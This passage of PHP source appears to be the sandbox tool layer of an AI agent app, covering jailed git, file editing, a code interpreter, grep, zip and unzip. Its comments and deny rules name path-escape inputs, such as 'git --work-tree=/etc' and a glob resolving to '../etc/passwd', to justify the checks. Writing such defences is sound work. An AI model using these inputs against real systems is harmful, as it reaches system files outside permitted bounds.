     * Run one `git` command inside the jail, WITHOUT a shell.
     *
     * argv is executed directly (like exec), so `;`, `|`, `$( )` are inert. The
     * global flags that retarget git at another tree are refused, and any
     * absolute path argument must stay inside the allowed roots — otherwise
     * `git --work-tree=/etc` or `git show --output=/etc/x` would step around
     * the jail. Read-vs-write is the caller's approval decision, not ours.
     */
    public static function gitRun($args, $cwd = null, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'git');
        $cwd = ($cwd === null || trim((string)$cwd) === '')
            ? ($roots[0] ?? self::appDir())
            : self::jail($cwd, $roots, 'git cwd');
        if (!is_dir($cwd)) { $cwd = $roots[0] ?? self::appDir(); }

        $argv = is_array($args) ? $args : preg_split('/\s+/', trim((string)$args));
        $argv = array_values(array_filter(array_map(fn($a) => (string)$a, (array)$argv), fn($a) => $a !== ''));
        if (!$argv) { throw new \RuntimeException('git: no arguments'); }
        $sub = strtolower($argv[0]);
        if (!in_array($sub, self::gitAllowed(), true)) {
            throw new \RuntimeException("git: \"$sub\" is not an allowed subcommand. Allowed: "
                . implode(', ', self::gitAllowed()));
        }
        $skipNext = false;
        foreach ($argv as $a) {
            $low = strtolower($a);
            // The value after -m/--message is prose, not a path: a commit
            // message beginning with "/" would otherwise be jailed and refused.
            if ($skipNext) { $skipNext = false; continue; }
            if ($low === '-m' || $low === '--message') { $skipNext = true; continue; }
            if ($low === '-c' || strpos($low, '--git-dir') === 0 || strpos($low, '--work-tree') === 0
                || $low === '--output' || strpos($low, '--output=') === 0) {
                throw new \RuntimeException('git: retargeting/global flags (-c, --git-dir, --work-tree, --output) are refused');
            }
            // A message passed as --message=... is prose too.
            if (strpos($low, '--message=') === 0) { continue; }
            if ($a !== '' && ($a[0] === '/' || preg_match('#^[a-z]:[\\/]#i', $a))) {
                self::jail($a, $roots, 'git path');   // throws when outside the roots
            }
        }

        $program = self::resolveProgram('git');
        if ($program === null) {
            throw new \RuntimeException('git is not installed on this host (or not on PATH).');
        }
        $exec = array_merge([$program], $argv);
        $env = [
            'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
            'HOME' => $cwd,
            'LANG' => 'C.UTF-8',
            'TERM' => 'dumb',
            'NO_COLOR' => '1',
            'GIT_CONFIG_NOSYSTEM' => '1',
            'GIT_TERMINAL_PROMPT' => '0',
            'GIT_PAGER' => 'cat',
            // A commit needs an identity. Without one git refuses ("Author
            // identity unknown"), which would make git_commit unusable on a
            // fresh host. An operator-set identity still wins.
            'GIT_AUTHOR_NAME'     => getenv('GIT_AUTHOR_NAME') ?: 'Loop Studio Agent',
            'GIT_AUTHOR_EMAIL'    => getenv('GIT_AUTHOR_EMAIL') ?: 'agent@localhost',
            'GIT_COMMITTER_NAME'  => getenv('GIT_COMMITTER_NAME') ?: 'Loop Studio Agent',
            'GIT_COMMITTER_EMAIL' => getenv('GIT_COMMITTER_EMAIL') ?: 'agent@localhost',
        ];
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open($exec, $descriptors, $pipes, $cwd, $env);
        if (!is_resource($proc)) { throw new \RuntimeException('git: could not start the process'); }
        fclose($pipes[0]);
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $exit = proc_close($proc);
        $limit = 200000;
        $trunc = strlen($stdout) > $limit;
        if ($trunc) { $stdout = substr($stdout, 0, $limit); }
        return [
            'ok' => $exit === 0,
            'exit' => $exit,
            'stdout' => (string)$stdout,
            'stderr' => trim((string)$stderr),
            'truncated' => $trunc,
        ];
    }

    /**
     * Apply several edits at once, all-or-nothing.
     *
     * Every target is read and every edit applied IN MEMORY first; the writes
     * only happen once all edits have succeeded. A bad edit half-way through
     * therefore leaves every file untouched, which is what makes this safe to
     * offer as one tool call instead of many.
     */
    public static function multiEdit($edits, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'multi_edit');
        if (!is_array($edits) || !$edits) { throw new \RuntimeException('multi_edit: no edits given'); }
        $staged = [];
        $order = [];
        $results = [];
        foreach ($edits as $e) {
            if (!is_array($e)) { throw new \RuntimeException('multi_edit: every edit must be an object'); }
            $rel = (string)($e['path'] ?? '');
            $old = (string)($e['old_string'] ?? $e['old_str'] ?? '');
            $new = (string)($e['new_string'] ?? $e['new_str'] ?? '');
            $all = !empty($e['replace_all']);
            if ($rel === '' || $old === '') {
                throw new \RuntimeException('multi_edit: every edit needs "path" and "old_string"');
            }
            $full = self::jail($rel, $roots, 'multi_edit');
            if (!array_key_exists($full, $staged)) {
                if (!is_file($full)) { throw new \RuntimeException("multi_edit: not a file: $rel"); }
                $raw = @file_get_contents($full);
                if ($raw === false) { throw new \RuntimeException("multi_edit: cannot read $rel"); }
                $staged[$full] = $raw;
                $order[] = $full;
            }
            $raw = $staged[$full];
            $count = substr_count($raw, $old);
            if ($count === 0) {
                throw new \RuntimeException("multi_edit: old string not found in $rel (read it first; match exactly)");
            }
            if ($count > 1 && !$all) {
                throw new \RuntimeException("multi_edit: old string appears $count times in $rel; add context or set replace_all");
            }
            if ($all) {
                $staged[$full] = str_replace($old, $new, $raw);
            } else {
                $pos = strpos($raw, $old);
                $staged[$full] = substr_replace($raw, $new, $pos, strlen($old));
            }
            $results[] = ['path' => $full, 'replaced' => $all ? $count : 1];
        }
        foreach ($order as $full) {
            if (@file_put_contents($full, $staged[$full]) === false) {
                throw new \RuntimeException("multi_edit: cannot write $full");
            }
        }
        return ['applied' => $results, 'count' => count($results)];
    }

    /**
     * Stage the given paths (or everything, when none given) and commit.
     * Returns nothing_to_commit=true rather than failing when there was no
     * change — that is a normal outcome, not an error.
     */
    public static function gitCommit($message, $paths = [], $cwd = null, $scope = null) {
        $message = trim((string)$message);
        if ($message === '') { throw new \RuntimeException('git_commit: a commit message is required'); }
        $paths = array_values(array_filter(array_map('strval', (array)$paths), fn($p) => trim($p) !== ''));

        $add = ['add'];
        if ($paths) { $add[] = '--'; foreach ($paths as $p) { $add[] = $p; } }
        else { $add[] = '-A'; }
        $r1 = self::gitRun($add, $cwd, $scope);
        if (!$r1['ok']) {
            throw new \RuntimeException('git_commit: staging failed: ' . ($r1['stderr'] ?: 'exit ' . $r1['exit']));
        }

        $r2 = self::gitRun(['commit', '-m', $message], $cwd, $scope);
        $out = trim($r2['stdout'] . "\n" . $r2['stderr']);
        if (!$r2['ok']) {
            if (stripos($out, 'nothing to commit') !== false || stripos($out, 'no changes added') !== false) {
                return ['ok' => true, 'nothing_to_commit' => true, 'output' => $out];
            }
            throw new \RuntimeException('git_commit: ' . ($out !== '' ? $out : 'commit failed (exit ' . $r2['exit'] . ')'));
        }
        return ['ok' => true, 'nothing_to_commit' => false, 'output' => $out];
    }

    /**
     * Run a code snippet with an interpreter. STATELESS across calls — each
     * call is a fresh process, so variables do not survive — but the working
     * directory does, so files written by one call are there for the next.
     *
     * Off unless the operator turns on "Code interpreter" (sandbox.code_enabled),
     * because running whole snippets is a bigger power than the argv allowlist.
     */
    public static function runCode($language, $code, $opts = []) {
        $cfg = self::config();
        if (empty($cfg['code_enabled'])) {
            throw new \RuntimeException('code: the code interpreter is disabled. Turn on "Code interpreter" '
                . 'in the Config tab (sandbox.code_enabled).');
        }
        $map = [
            'python' => 'python3', 'python3' => 'python3', 'py' => 'python3',
            'node' => 'node', 'javascript' => 'node', 'js' => 'node',
            'bash' => 'bash', 'sh' => 'bash', 'shell' => 'bash',
            'ruby' => 'ruby', 'rb' => 'ruby', 'php' => 'php', 'perl' => 'perl',
        ];
        $lang = strtolower(trim((string)$language));
        if (!isset($map[$lang])) {
            throw new \RuntimeException("code: unsupported language \"$lang\" (python, node, bash, ruby, php, perl)");
        }
        $interp = $map[$lang];
        $ext = ['python3' => 'py', 'node' => 'js', 'bash' => 'sh', 'ruby' => 'rb', 'php' => 'php', 'perl' => 'pl'][$interp] ?? 'txt';

        $scope = $opts['scope'] ?? $opts['root'] ?? null;
        $roots = self::scopeRoots($scope, self::writeRoots(), 'code');
        $cwd = !empty($opts['cwd']) ? self::jail($opts['cwd'], $roots, 'code cwd') : ($roots[0] ?? self::appDir());
        if (!is_dir($cwd)) { $cwd = $roots[0] ?? self::appDir(); }

        $program = self::resolveProgram($interp);
        if ($program === null) {
            throw new \RuntimeException("code: $interp is not installed on this host.");
        }
        $tmp = rtrim($cwd, '/') . '/.loop-code-' . substr(md5($code . microtime(true)), 0, 10) . '.' . $ext;
        if (@file_put_contents($tmp, (string)$code) === false) {
            throw new \RuntimeException('code: could not write the snippet to run');
        }
        $env = [
            'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
            'HOME' => $cwd,
            'LANG' => 'C.UTF-8',
            'TERM' => 'dumb',
            'NO_COLOR' => '1',
            'PYTHONUNBUFFERED' => '1',
        ];
        $timeout = max(5, min(600, (int)($opts['timeout'] ?? $cfg['code_timeout'])));
        $maxBytes = (int)($opts['max_bytes'] ?? $cfg['exec_max_bytes']);
        $t0 = microtime(true);
        // The interpreter path was never audited at all, which is how a snippet
        // could launch something and leave `exec.log` with no record of it. Same
        // two-phase treatment as exec: start before the spawn, end after it.
        $runId = substr(bin2hex(random_bytes(6)), 0, 12);
        self::audit($interp, [$tmp], $cwd, null, null, [
            'run' => $runId, 'phase' => 'start', 'kind' => 'code',
            'agent' => (string)($opts['agent'] ?? ''),
        ]);
        try {
            $run = self::procRun([$program, $tmp], $cwd, $env, $timeout, $maxBytes);
        } finally {
            @unlink($tmp);
        }
        self::audit($interp, [$tmp], $cwd, $run['exit'], (int)round((microtime(true) - $t0) * 1000), [
            'run' => $runId, 'phase' => 'end', 'kind' => 'code',
            'agent' => (string)($opts['agent'] ?? ''), 'timeout' => !empty($run['timed_out']),
        ]);
        return [
            'language' => $interp,
            'exit' => $run['exit'],
            'stdout' => $run['stdout'],
            'stderr' => $run['stderr'],
            'truncated' => $run['truncated'],
            'timed_out' => $run['timed_out'],
            'ms' => (int)round((microtime(true) - $t0) * 1000),
        ];
    }

    /**
     * Run an argv vector to completion with a wall-clock timeout and an output
     * cap, no shell. Shared by the code interpreter.
     */
    private static function procRun(array $exec, $cwd, array $env, $timeout, $maxBytes) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open($exec, $descriptors, $pipes, $cwd, $env);
        if (!is_resource($proc)) { throw new \RuntimeException('could not start the process'); }
        fclose($pipes[0]);
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);

        $out = '';
        $err = '';
        $timedOut = false;
        $truncated = false;
        $deadline = microtime(true) + max(1, (int)$timeout);
        while (true) {
            $out .= (string)stream_get_contents($pipes[1]);
            $err .= (string)stream_get_contents($pipes[2]);
            if (strlen($out) >= $maxBytes) { $truncated = true; @proc_terminate($proc); break; }
            $status = proc_get_status($proc);
            if (!$status['running']) { break; }
            if (microtime(true) > $deadline) { $timedOut = true; @proc_terminate($proc); break; }
            usleep(15000);
        }
        $out .= (string)stream_get_contents($pipes[1]);
        $err .= (string)stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $exit = proc_close($proc);
        if (strlen($out) > $maxBytes) { $out = substr($out, 0, $maxBytes); $truncated = true; }
        if (strlen($err) > $maxBytes) { $err = substr($err, 0, $maxBytes); $truncated = true; }
        return ['stdout' => trim($out), 'stderr' => trim($err), 'exit' => $exit,
            'timed_out' => $timedOut, 'truncated' => $truncated];
    }

    /**
     * Raw text for the editor. Unlike readFile() this keeps the file exactly as
     * written (no line numbers), because whitespace is the thing being edited.
     */
    public static function readText($path, $scope = null, $maxBytes = null) {
        $roots = self::scopeRoots($scope, self::readRoots(), 'read_text');
        $full = self::jail($path, $roots, 'read_text');
        if (!is_file($full)) { throw new \RuntimeException("read_text: not a file: $full"); }
        $size = @filesize($full);
        if ($size === false) { throw new \RuntimeException('read_text: cannot stat file'); }
        $limit = $maxBytes === null ? 2000000 : max(1024, min(5000000, (int)$maxBytes));
        $raw = @file_get_contents($full, false, null, 0, min($size, $limit));
        if ($raw === false) { throw new \RuntimeException('read_text: cannot read file'); }
        if (strpos(substr($raw, 0, 8192), "\0") !== false) {
            throw new \RuntimeException('read_text: looks like a binary file');
        }
        return [
            'path' => $full,
            'name' => basename($full),
            'bytes' => $size,
            'truncated' => $size > strlen($raw),
            'content' => $raw,
            'mime' => self::mimeFor($full),
            'mode' => @fileperms($full) !== false ? substr(sprintf('%o', @fileperms($full)), -4) : null,
        ];
    }

    /** Binary file for image/PDF previews and downloads, base64 for JSON transport. */
    public static function readBinary($path, $scope = null, $maxBytes = null) {
        $roots = self::scopeRoots($scope, self::readRoots(), 'download');
        $full = self::jail($path, $roots, 'download');
        if (!is_file($full)) { throw new \RuntimeException("download: not a file: $full"); }
        $size = @filesize($full);
        if ($size === false) { throw new \RuntimeException('download: cannot stat file'); }
        $limit = $maxBytes === null ? 20 * 1024 * 1024 : max(1024, min(25 * 1024 * 1024, (int)$maxBytes));
        if ($size > $limit) {
            throw new \RuntimeException("download: file is too large ({$size} bytes, limit {$limit})");
        }
        $raw = @file_get_contents($full);
        if ($raw === false) { throw new \RuntimeException('download: cannot read file'); }
        return [
            'path' => $full,
            'name' => basename($full),
            'bytes' => $size,
            'mime' => self::mimeFor($full),
            'data' => base64_encode($raw),
        ];
    }

    /** Write an uploaded file from base64 content. */
    public static function writeBinary($path, $data, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'upload');
        $full = self::jail($path, $roots, 'upload');
        $raw = base64_decode((string)$data, true);
        if ($raw === false) { throw new \RuntimeException('upload: content is not valid base64'); }
        if (strlen($raw) > 25 * 1024 * 1024) {
            throw new \RuntimeException('upload: file is larger than the 25 MB limit');
        }
        $parent = dirname($full);
        if (!is_dir($parent) && !@mkdir($parent, 0775, true) && !is_dir($parent)) {
            throw new \RuntimeException("upload: cannot create directory $parent");
        }
        $bytes = @file_put_contents($full, $raw);
        if ($bytes === false) { throw new \RuntimeException("upload: cannot write $full"); }
        return [
            'path' => $full,
            'name' => basename($full),
            'bytes_written' => $bytes,
            'mode' => @fileperms($full) !== false ? substr(sprintf('%o', @fileperms($full)), -4) : null,
        ];
    }

    /** Create a directory inside the writable sandbox. */
    public static function makeDir($path, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'mkdir');
        $full = self::jail($path, $roots, 'mkdir');
        if (file_exists($full)) { throw new \RuntimeException("mkdir: already exists: $full"); }
        if (!@mkdir($full, 0775, true) && !is_dir($full)) {
            throw new \RuntimeException("mkdir: cannot create $full");
        }
        return ['path' => $full, 'name' => basename($full)] + self::entryInfo($full, basename($full), 'dir');
    }

    /** Recursively remove one path, refusing to delete an allowlisted root. */
    public static function removePath($path, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'remove');
        $full = self::jail($path, $roots, 'remove');
        foreach ($roots as $root) {
            if ($full === $root) {
                throw new \RuntimeException('remove: refusing to delete the sandbox root itself');
            }
        }
        $count = self::removeTree($full);
        return ['path' => $full, 'removed' => $count];
    }

    private static function removeTree($path) {
        if (is_link($path) || is_file($path)) {
            if (!@unlink($path)) { throw new \RuntimeException("remove: cannot delete $path"); }
            return 1;
        }
        if (!is_dir($path)) { throw new \RuntimeException("remove: not a file or directory: $path"); }
        $items = @scandir($path);
        if ($items === false) { throw new \RuntimeException("remove: cannot read directory $path"); }
        $count = 0;
        foreach ($items as $name) {
            if ($name === '.' || $name === '..') { continue; }
            $count += self::removeTree($path . '/' . $name);
        }
        if (!@rmdir($path)) { throw new \RuntimeException("remove: cannot delete directory $path"); }
        return $count + 1;
    }

    /** Copy or move a path. Destination directories receive the source basename. */
    public static function copyMove($from, $to, $move = false, $scope = null) {
        $label = $move ? 'move' : 'copy';
        $readRoots = self::scopeRoots($scope, self::readRoots(), $label);
        $writeRoots = self::scopeRoots($scope, self::writeRoots(), $label);
        // Copy only needs read access to the source. Move deletes it, so the
        // source must ALSO be inside a writable root; otherwise a read-only
        // allowlist entry could be emptied with move.
        $source = self::jail($from, $move ? $writeRoots : $readRoots, $label);
        $dest = self::jail($to, $writeRoots, $label);
        if (is_dir($dest)) { $dest = rtrim($dest, '/') . '/' . basename($source); }
        if ($source === $dest) { throw new \RuntimeException("$label: source and destination are the same"); }
        if (is_dir($source) && strpos($dest, $source . '/') === 0) {
            throw new \RuntimeException("$label: cannot put a directory inside itself");
        }
        if (file_exists($dest) || is_link($dest)) {
            throw new \RuntimeException("$label: destination already exists: $dest");
        }
        $parent = dirname($dest);
        if (!is_dir($parent) && !@mkdir($parent, 0775, true) && !is_dir($parent)) {
            throw new \RuntimeException("$label: cannot create directory $parent");
        }
        if (!$move || !@rename($source, $dest)) {
            $count = self::copyTree($source, $dest);
            if ($move) { self::removeTree($source); }
        } else {
            $count = 1;
        }
        return [
            'from' => $source, 'to' => $dest, 'moved' => $move,
            'copied' => $count, 'name' => basename($dest),
        ];
    }

    private static function copyTree($source, $dest) {
        if (is_link($source)) {
            throw new \RuntimeException('copy: symbolic links cannot be copied');
        }
        if (is_file($source)) {
            if (!@copy($source, $dest)) { throw new \RuntimeException("copy: cannot write $dest"); }
            @chmod($dest, @fileperms($source) & 0777);
            return 1;
        }
        if (!is_dir($source)) { throw new \RuntimeException("copy: not a file or directory: $source"); }
        if (!is_dir($dest) && !@mkdir($dest, 0775, true) && !is_dir($dest)) {
            throw new \RuntimeException("copy: cannot create directory $dest");
        }
        $items = @scandir($source);
        if ($items === false) { throw new \RuntimeException("copy: cannot read directory $source"); }
        $count = 0;
        foreach ($items as $name) {
            if ($name === '.' || $name === '..') { continue; }
            $count += self::copyTree($source . '/' . $name, $dest . '/' . $name);
        }
        return $count;
    }

    /** Change Unix permissions. Windows accepts the call but mostly ignores it. */
    public static function setMode($path, $mode, $scope = null) {
        $roots = self::scopeRoots($scope, self::writeRoots(), 'chmod');
        $full = self::jail($path, $roots, 'chmod');
        $mode = trim((string)$mode);
        if (!preg_match('/^[0-7]{3,4}$/', $mode)) {
            throw new \RuntimeException('chmod: mode must be three or four octal digits, e.g. 644');
        }
        if (!@chmod($full, octdec($mode))) { throw new \RuntimeException("chmod: cannot change $full"); }
        clearstatcache(true, $full);
        return [
            'path' => $full,
            'mode' => substr(sprintf('%o', @fileperms($full)), -4),
        ];
    }

    public static function statPath($path, $scope = null) {
        $roots = self::scopeRoots($scope, array_unique(array_merge(self::readRoots(), self::writeRoots())), 'stat');
        $full = self::jail($path, $roots, 'stat');
        return ['path' => $full] + self::entryInfo($full, basename($full));
    }

    /**
     * List a directory. When $path is omitted, list the roots themselves so a
     * model can orient itself without guessing absolute paths.
     */
    public static function listDir($path = null, $limit = 200, $scope = null) {
        $roots = array_unique(array_merge(self::readRoots(), self::writeRoots()));
        $roots = self::scopeRoots($scope, $roots, 'list_dir');
        if (!$roots) {
            throw new \RuntimeException(
                'list_dir: the sandbox has no allowed directories (it defaults to this '
                . 'app\'s own folder). Set one in the Config tab ("Working Project '
                . 'Directory"), or in storage/config.json under "sandbox".'
            );
        }
        if ($path === null || trim((string)$path) === '') {
            return [
                'dirs' => $roots,
                'hint' => 'Pass a path relative to one of these, or an absolute path inside them.',
            ];
        }
        $full = self::jail($path, $roots, 'list_dir');
        // Report writability for the directory that was actually listed, not
        // for "any root somewhere": a read-only root must not answer true just
        // because a different allowlisted root is writable.
        $writable = array_map(function ($r) { return rtrim($r, '/'); }, self::writeRoots());
        $canWrite = false;
        foreach ($writable as $w) {
            if ($full === $w || strpos($full, $w . '/') === 0) { $canWrite = true; break; }
        }
        // A model that asks list_dir about a FILE ("can you see local-IPs.txt?")
        // used to get "not a directory", which reads as "the file is missing".
        // Listing the single entry answers the actual question.
        if (!is_dir($full)) {
            if (is_file($full)) {
                return [
                    'path' => $full,
                    'entries' => [self::entryInfo($full, basename($full))],
                    'skipped' => 0,
                    'writable' => $canWrite,
                ];
            }
            throw new \RuntimeException("list_dir: not a directory: $full");
        }

        $limit = max(1, min(2000, (int)$limit));
        $entries = @scandir($full);
        if ($entries === false) { throw new \RuntimeException("list_dir: cannot read directory $full"); }

        $out = [];
        $skipped = 0;
        foreach ($entries as $name) {
            if ($name === '.' || $name === '..') { continue; }
            $child = $full . '/' . $name;
            if (count($out) >= $limit) { $skipped++; continue; }
            $out[] = self::entryInfo($child, $name);
        }
        usort($out, function ($a, $b) {
            if ($a['type'] !== $b['type']) { return $a['type'] === 'dir' ? -1 : 1; }
            return strcmp($a['name'], $b['name']);
        });
        return [
            'path' => $full, 'entries' => $out, 'skipped' => $skipped,
            'writable' => $canWrite,
        ];
    }

    /** Filename glob, e.g. "*.php", or a path-relative one like "ui/js/ *.js". */
    public static function globFiles($pattern, $root = null, $scope = null) {
        $roots = self::scopeRoots($scope, self::readRoots(), 'glob');
        if (!$roots) {
            throw new \RuntimeException('glob: no directory is allowed (it defaults to this app\'s own '
                . 'folder). Set one in the Config tab ("Working Project Directory").');
        }
        $pattern = trim((string)$pattern);
        if ($pattern === '') { throw new \RuntimeException('glob: empty pattern'); }

        if ($root !== null && trim((string)$root) !== '') {
            $base = self::jail($root, $roots, 'glob');
        } else {
            // A pattern like "ui/js/*.js" is itself relative to a root.
            $base = null;
            $prefix = trim(dirname($pattern), '.');
            $probe = $prefix === '' ? '' : $prefix;
            if ($probe !== '' && strpos($probe, '*') === false) {
                try { $base = self::jail($probe, $roots, 'glob'); }
                catch (\RuntimeException $e) { $base = null; }
            }
            if ($base === null) { $base = $roots[0]; }
        }

        $matches = glob($base . '/' . ltrim($pattern, '/'), GLOB_BRACE);
        if ($matches === false) { $matches = []; }
        $keep = [];
        foreach ($matches as $m) {
            // glob() returns the pattern literally, so a pattern containing
            // ".." produces paths like root/../etc/passwd that pass a raw
            // prefix test. Resolve the match before checking the jail.
            $real = realpath($m);
            if ($real === false) { continue; }
            $real = rtrim(str_replace('\\', '/', $real), '/');
            if (self::within($real, $roots) && !in_array($real, $keep, true)) { $keep[] = $real; }
            if (count($keep) >= 500) { break; }
        }
        sort($keep);
        return ['pattern' => $pattern, 'base' => $base, 'matches' => $keep, 'count' => count($keep)];
    }

    /**
     * Grep across the readable roots. Skips binary files and the usual noise
     * directories so a search stays fast and its output readable.
     */
    public static function grepCode($pattern, $glob = '*.{php,js,css,html,json,md,ts,py,sh,yml,yaml,txt}', $maxMatches = 80, $scope = null) {
        $roots = self::scopeRoots($scope, self::readRoots(), 'grep');
        if (!$roots) {
            throw new \RuntimeException('grep: no directory is allowed (it defaults to this app\'s own '
                . 'folder). Set one in the Config tab ("Working Project Directory").');
        }
        $pattern = (string)$pattern;
        if ($pattern === '') { throw new \RuntimeException('grep: empty pattern'); }
        $pattern = self::asRegex($pattern);

        $maxMatches = max(1, min(500, (int)$maxMatches));
        $skipDirs = ['.git', 'node_modules', 'vendor', '.svn', '__pycache__', '.idea', 'dist', 'build'];

        $results = [];
        $filesScanned = 0;
        foreach ($roots as $root) {
            $it = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($root, \FilesystemIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($it as $file) {
                if (count($results) >= $maxMatches) { break 2; }
                if (!$file->isFile() || $file->getSize() > 1048576) { continue; }
                // readFile() resolves a symlink and rejects one that leaves
                // the jail; grep must do the same instead of reading the
                // link target directly.
                if ($file->isLink()) { continue; }
                $path = str_replace('\\', '/', $file->getPathname());
                $rel = ltrim(substr($path, strlen($root)), '/');
                if (self::anySegment($rel, $skipDirs)) { continue; }
                if ($glob && !self::matchesAny($glob, $file->getFilename())) { continue; }

                $raw = @file_get_contents($path, false, null, 0, 1048576);
                if ($raw === false || strpos(substr($raw, 0, 8192), "\0") !== false) { continue; }
                $filesScanned++;

                $lines = preg_split('/\r\n|\r|\n/', $raw);
                foreach ($lines as $i => $line) {
                    if (count($results) >= $maxMatches) { break; }
                    if (@preg_match($pattern, $line)) {
                        $results[] = [
                            'file' => $path,
                            'rel' => $rel,
                            'line' => $i + 1,
                            'text' => trim(substr($line, 0, 300)),
                        ];
                    }
                }
            }
        }
        return ['pattern' => $pattern, 'matches' => $results, 'count' => count($results), 'files_scanned' => $filesScanned];
    }

    /** The archive-relative name for one jail-resolved path. */
    private static function zipLocalName($full, $roots) {
        foreach ($roots as $root) {
            if ($full === $root) { return basename($root); }
            if (strpos($full, $root . '/') === 0) {
                return ltrim(substr($full, strlen($root)), '/');
            }
        }
        return basename($full);
    }

    /** Add one file or directory tree to a ZipArchive. */
    private static function zipAddPath($zip, $full, $local, $dest) {
        $local = trim(str_replace('\\', '/', $local), '/');
        if ($local === '' || $full === $dest) { return; }
        if (is_link($full)) {
            throw new \RuntimeException('zip: symbolic links cannot be archived');
        }
        if (is_dir($full)) {
            $zip->addEmptyDir($local);
            $items = @scandir($full);
            if ($items === false) { throw new \RuntimeException("zip: cannot read $full"); }
            foreach ($items as $name) {
                if ($name === '.' || $name === '..') { continue; }
                self::zipAddPath($zip, $full . '/' . $name, $local . '/' . $name, $dest);
            }
            return;
        }
        if (!is_file($full)) { throw new \RuntimeException("zip: not a file or directory: $full"); }
        if (!$zip->addFile($full, $local)) {
            throw new \RuntimeException("zip: cannot add $full");
        }
    }

    /**
     * Create a zip. ZipArchive is used when available, with PharData as a
     * fallback because plenty of minimal PHP builds omit ext-zip.
     */
    public static function zipPaths($paths, $dest, $scope = null) {
        $readRoots = self::scopeRoots($scope, self::readRoots(), 'zip');
        $writeRoots = self::scopeRoots($scope, self::writeRoots(), 'zip');
        $destFull = self::jail($dest, $writeRoots, 'zip');
        if (is_dir($destFull)) {
            $destFull = rtrim($destFull, '/') . '/archive.zip';
        } elseif (strtolower(substr($destFull, -4)) !== '.zip') {
            $destFull .= '.zip';
        }
        $parent = dirname($destFull);
        if (!is_dir($parent) && !@mkdir($parent, 0775, true) && !is_dir($parent)) {
            throw new \RuntimeException("zip: cannot create directory $parent");
        }
        if (is_file($destFull) && !@unlink($destFull)) {
            throw new \RuntimeException("zip: cannot replace $destFull");
        }

        $input = is_array($paths) ? $paths : [$paths];
        if (!$input) { $input = ['.']; }
        $sources = [];
        foreach ($input as $p) {
            $p = trim((string)$p);
            if ($p === '') { continue; }
            $full = self::jail($p, $readRoots, 'zip');
            $sources[] = [$full, self::zipLocalName($full, $readRoots)];
        }
        if (!$sources) { throw new \RuntimeException('zip: nothing selected'); }

        $count = 0;
        if (class_exists('ZipArchive')) {
            $zip = new \ZipArchive();
            if ($zip->open($destFull, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== true) {
                throw new \RuntimeException("zip: cannot create $destFull");
            }
            foreach ($sources as [$full, $local]) {
                self::zipAddPath($zip, $full, $local, $destFull);
                $count++;
            }
            $zip->close();
        } elseif (class_exists('PharData')) {
            try {
                $phar = new \PharData($destFull);
                foreach ($sources as [$full, $local]) {
                    if (is_dir($full)) {
                        $phar->addEmptyDir(trim($local, '/'));
                        $it = new \RecursiveIteratorIterator(
                            new \RecursiveDirectoryIterator($full, \FilesystemIterator::SKIP_DOTS),
                            \RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($it as $file) {
                            if ($file->isLink()) { continue; }
                            $name = str_replace('\\', '/', $file->getPathname());
                            // Never add the archive to itself when the archive
                            // lives inside the directory being zipped.
                            if ($name === $dest) { continue; }
                            $rel = ltrim(substr($name, strlen($full)), '/');
                            $phar->addFile($file->getPathname(), trim($local . '/' . $rel, '/'));
                        }
                    } elseif (is_file($full) && !is_link($full)) {
                        $phar->addFile($full, trim($local, '/'));
                    }
                    $count++;
                }
                unset($phar);
            } catch (\Throwable $e) {
                throw new \RuntimeException('zip: ' . $e->getMessage());
            }
        } else {
            throw new \RuntimeException('zip: this PHP has neither ZipArchive nor PharData');
        }

        clearstatcache(true, $destFull);
        return [
            'path' => $destFull,
            'name' => basename($destFull),
            'bytes' => @filesize($destFull),
            'items' => $count,
        ];
    }

    /** Resolve a zip entry name inside the extraction directory, refusing .. */
    private static function zipTarget($dest, $name) {
        $name = str_replace('\\', '/', (string)$name);
        if ($name === '' || $name === '.' || $name === './') { return $dest; }
        if (preg_match('#^([a-z]:)?/#i', $name)) {
            throw new \RuntimeException("unzip: refusing absolute entry name: $name");
        }
        $parts = [];
        foreach (explode('/', $name) as $part) {
            if ($part === '' || $part === '.') { continue; }
            if ($part === '..') { throw new \RuntimeException("unzip: refusing path traversal: $name"); }
            $parts[] = $part;
        }
        if (!$parts) { return $dest; }
        $target = rtrim($dest, '/') . '/' . implode('/', $parts);
        $resolved = self::resolveExisting($target);
        if ($resolved === null || ($resolved !== $dest && strpos($resolved, $dest . '/') !== 0)) {
            throw new \RuntimeException("unzip: entry escapes the destination: $name");
        }
        return $resolved;
    }

    /** Extract a zip inside the writable sandbox, with zip-slip protection. */
    public static function unzipArchive($path, $dest = '.', $scope = null) {
        $readRoots = self::scopeRoots($scope, self::readRoots(), 'unzip');
        $writeRoots = self::scopeRoots($scope, self::writeRoots(), 'unzip');
        $zipPath = self::jail($path, $readRoots, 'unzip');
        $destFull = self::jail($dest, $writeRoots, 'unzip');
        if (!is_file($zipPath)) { throw new \RuntimeException("unzip: not a file: $zipPath"); }
        if (file_exists($destFull) && !is_dir($destFull)) {
            throw new \RuntimeException("unzip: destination is a file: $destFull");
        }
        if (!is_dir($destFull) && !@mkdir($destFull, 0775, true) && !is_dir($destFull)) {
            throw new \RuntimeException("unzip: cannot create directory $destFull");
        }
        $destFull = rtrim(str_replace('\\', '/', realpath($destFull) ?: $destFull), '/');

        $count = 0;
        if (class_exists('ZipArchive')) {
            $zip = new \ZipArchive();
